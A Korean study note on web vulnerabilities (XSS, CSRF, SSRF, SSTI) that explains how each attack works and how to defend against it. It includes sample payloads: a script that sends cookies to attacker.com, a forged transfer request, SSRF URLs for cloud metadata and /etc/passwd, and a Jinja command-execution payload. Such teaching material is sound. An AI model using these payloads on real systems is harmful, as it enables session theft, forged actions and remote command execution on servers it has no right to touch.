# XSS (Cross-Site Scripting)

공격자가 악의적인 스크립트를 코드에 삽입하여 다른 사용자의 브라우저에서 실행되게 만드는 공격입니다.

브라우저는 “Same-Origin Policy”(동일 출처 정책) 이라는 규칙으로 보안을 유지해서 “~~~.com”에서 온 스크립트는 “~~~.com”의 데이터 (쿠키, DOM, LoaclStorage…)에 접근할 수 있습니다.

따라서 XSS로 스크립트가 실행되면 그 사용자의 권한으로 브라우저에서 세션 쿠키 탈취 등의 공격을 할 수 있습니다.

XSS는 동작 방법에 따라 3가지 유형으로 나눌 수 있습니다.

## Stored XSS (저장형 XSS)

공격 스크립트가 서버 DB에 저장되고, 페이지를 여는 모든 사용자의 브라우저에서 작동되는 형태의 XSS입니다.

```smalltalk
INFO Stored XSS 동작 흐름
1. 공격자가 댓글 / 게시글 / 프로필에 악성 스크립트를 입력
2. 서버가 이를 DB에 그대로 저장
3. 다른 사용자가 해당 페이지를 방문
4. 서버가 DB에서 데이터를 꺼내 HTML에 삽입하여 응답
5. 피해자 브라우저에서 스크립트가 실행
```

예를 들어 공격자가 아래와 같은 댓글을 입력한다고 할 때

```jsx
<script>
    fetch('https://attacker.com/log?c=' + encodeUR|Component(document.cookie));
</script>
```

서버가 이 스크립트를 그대로 저장하고, 다른 사용자가 게시글을 열면 페이지 소스에서 <script> 태그가 그대로 들어가서 브라우저는 이를 실행하고, 피해자의 세션 쿠키가 공격자 서버로 전송됩니다.

## Reflected XSS (반사형 XSS)

공격 스크립트가 URL이나 폼 데이터에 담겨 서버로 갔다가, 응답에 그대로 반사되어 실행되는ㄴ 형태의 XSS 입니다. DB에 저장되지 않습니다.

```smalltalk
INFO Reflected XSS 동작 흐름
1. 공격자가 악성 스크립트가 포함된 URL을 만듦
2. 피해자가 그 URL을 클릭하도록 유도
3. 피해자가 클릭하면 서버로 요청이 전송됨
4. 서버가 그 파라미터를 응답 페이지에 그대로 포함시켜 변환함
5. 피해자 브라우저에서 스크립트 실행
```

## DOM-based XSS (Dom 기반 XSS)

서버는 관여하지 않고, 클라이언트 측 Javascript가 DOM을 안전하지 않게 조작하여 발생하는 XSS 형태입니다.

```smalltalk
INFO Dom-based XSS 동작 흐름
1. 페이지의 JS가 URL / 해시 / 입력값 등을 읽어들임
2. 그 값을 검증 없이 innerHTML, eval, document.write 등으로 DOM에 삽입
3. 그 안에 포함된 스크립트가 실행됨
```

## XSS 방어 기법

1. 출력 시 컨텍스트별 이스케이프 적용

사용자 입력을 HTML로 출력할 경우에는 이스케이프를 적용하는 방식입니다.

```html
< -> &lt;
> -> &gt;
" -> &quot;
' -> &#x27;
& -> &amp;
```

1. Content Security Polity (CSP)

HTTP 응답 헤더로 어떤 스크립트만 실행할 수 있는지 브라우저로 알려주는 방식입니다.

```jsx
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.cdn.com
```

이렇게 설정하면 인라인 스크립트(<script>…</script>)와 외부 스크립트를 차단할 수 있습니다.

1. 쿠키 설정

세션 쿠키에 HttpOnly 플래그를 설정하면 Javascript에서 document.cookie로 읽을 수 없습니다.

XSS가 발생해도 쿠키 탈취와 같은 공격을 막을 수 있습니다.

---

# CSRF (Cross-Site Request Forgery)

CSRF는 피해자가 로그인 상태를 악용해서, 피해자가 모르게 서버로 요청을 보내는 공격입니다. 공격자가 피해자의 신분(세션 쿠키)으로 서버에 요청을 보내는 방식입니다. 피해자도 모르는 사이에 송금이 이루어지거나, 비밀번호가 변경되는 등의 공격이 가능합니다.

```smalltalk
INFO CSRF 동작 흐름
1. 공격자가 악성 페이지를 만듦
2. 피해자를 링크로 유인
3. 피해자가 클릭. 페이지가 로드되면서 JavaScript가 동작
4. 브라우저가 POST 요청을 보내며 자동으로 세션 쿠키 첨부
5. 서버는 정상 세션이므로 요청을 실행
```

## CSRF의 형태

1. GET 방식 CSRF

GET 요청으로 상태를 변경한다면(하면 안되는 설계), 이미지 태그만으로도 공격 가능

```html
<img src="https://mybank.com/transfer?to=attacker&amount=1000000">
```

1. POST 방식 CSRF

숨겨진 폼 + 자동 제출 스크립트로 구현

1. JSON  / 커스텀 헤더 CSRF

API는 보통 Content-Type: application / json으로 데이터를 받는데, 서버가 Content-Type을 검증하지 않는다면 text / plain으로 우회 가능

## CSRF 방어 기법

1. CSRF 토큰

서버가 폼 / 페이지 마다 예측 불가능한 무작위 토큰을 생성해서 같이 보냄. 요청 시 이 토큰을 함께 제출해야 함.

1. SameSite 쿠키 속성

쿠키에 SameSite 속성을 설정하면, 다른 사이트에서 시작된 요청에는 쿠키를 자동으로 첨부하지 않음

1. Origin / Referer 헤더 검증

HTTP 요청 헤더의 Origin / Referer를 보면 어느 사이트에서 요청이 시작되었는지 확인 가능

1. 민감한 액션은 재인증 / 추가 확인

중요한 행위를 수행하는 경우에는 비밀번호 재입력 요구, 2차 인증 등의 추가적인 작업을 요청

---

# SSRF (Server-side Request Forgery)

공격자가 웹 애플리케이션의 취약점을 이용해 서버가 의도하지 않은 내부 / 외부 URL로 요청을 보내도록 조작하는 웹 보안 취약점입니다.

```smalltalk
INFO SSRF 동작 흐름
1. 공격자는 사용자가 입력한 URL을 통해 서버가 외부 리소스를 가져오는 기능을 찾음
2. 공격자는 파라미터에 내부 서버 IP, 메타데이터 서비스 주소, 또는 공격자 서버 주소를 삽입하여 서버로 전송
3. 취약한 웹 애플리케이션은 검증 없이 공격자가 지정한 내부 / 외부 주소로 요청을 보냄
4. 서버는 방화벽 뒤에 있는 내부 인프라에 접근하여 결과를 가져옴
5. 서버는 수신한 응답을 다시 공격자에게 보여주거나, 해당 요청을 통해 내부 정보를 유출
```

## SSRF의 형태

1. 기본 SSRF (외부 → 내부 요청)

사용자가 입력한 URL을 서버가 그대로 요청

```python
GET /fetch?url=http://127.0.0.1/admin
```

1. 클라우드 메타데이터 접근

서버가 클라우드 내부 정보에 접근 

```python
GET /fetch?url=http://169.254.169.254/latest/meta-data/
```

1. 포트 스캐닝

서버를 이용해 내부 포트 탐색

```smalltalk
GET /fetch?url=http://127.0.0.1:8000
```

1. 프로토콜 악용 (비 HTTP 요청)

다양한 프로토콜을 이용한 공격

```smalltalk
GET /fetch?url=file:///etc/passwd
```

1. 리다이렉트 및 우회 공격

외부 URL을 통해 내부로 우회 접근

```smalltalk
GET /fetch?url=http://attacker.com/redirect
```

## SSRF 방어 기법

1. URL 화이트리스트

서버가 요청할 수 있는 URL을 신뢰된 도메인으로만 제한

1. 내부 IP 접근 차단

서버가 내부 네트워크로 요청하지 못하도록 제한

1. DNS 검증

도메인이 내부 IP로 변조되는 공격 방지

1. 리다이렉트 및 프로토콜 제한

외부 → 내부 우회 공격 방지

1. 네트워크 레벨 차단

애플리케이션 외부에서도 보안 적용

---

# SSTI (Server-Side Template Injection)

SSTI는 공격자가 서버 측 템플릿 엔진에 악성 코드를 삽입하여 실행하는 보안 취약점입니다.

```smalltalk
INFO SSTI 동작 흐름
1. 개발자가 사용자 입력을 템플릿에 그대로 포함
2. 공격자가 템플릿 문법이 포함된 입력값 전달
3. 서버가 입력값을 템플릿 엔진에 전달
4. 템플릿 엔진이 입력을 코드처럼 해석 및 실행
5. 내부 정보 노출 또는 서버 명령 실행 발생
```

## SSTI의 형태

1. 단순 표현 실행

템플릿 문법을 이용해 연산 수행 여부 확인

```python
{{ 10 + 20 }}
```

1. 객체 접근

템플릿 내부 객체 접근

```python
{{ request.method }}
{{ session }}
```

1. 클래스 및 속성 접근

파이썬 객체 구조를 따라 내부 탐색

```python
{{ ''.__class__ }}
{{ ''.__class__.__base__ }}
```

1. 환경 및 설정 정보 접근

서버 설정값이나 환결 정보 노출

```python
{{ config }}
```

1. 코드 실행

시스템 명령 실행

```python
{{ cycler.__init__.__globals__['os'].popen('whoami').read() }}
```

## SSTI 방어 기법

1. 사용자 입력을 템플릿에 직접 삽입 금지

사용자 입력을 템플릿 코드로 렌더링하지 않도록 설계

```python
# 위험
render_template_string(user_input)
# 안전
render_template("index.html", name=user_input)
```

1. 템플릿 문법 이스케이프 처리

입력값이 코드로 해석되지 않도록 문자열로 변환

```python
{{ user_input | e }}
```

1. Sandboxing 적용

템플릿에서 접근 가능한 기능 제한

```python
from jinja2.sandbox import SandboxexEnvironment
env = SandboxedEnvironment()
```

1. 위험한 객체 및 함수 노출 금지

템플릿에 전달되는 데이터 최소화 

1. 최신 버전 유지 및 보안 설정

템플릿 엔진 업데이트 및 안전 설정 적용
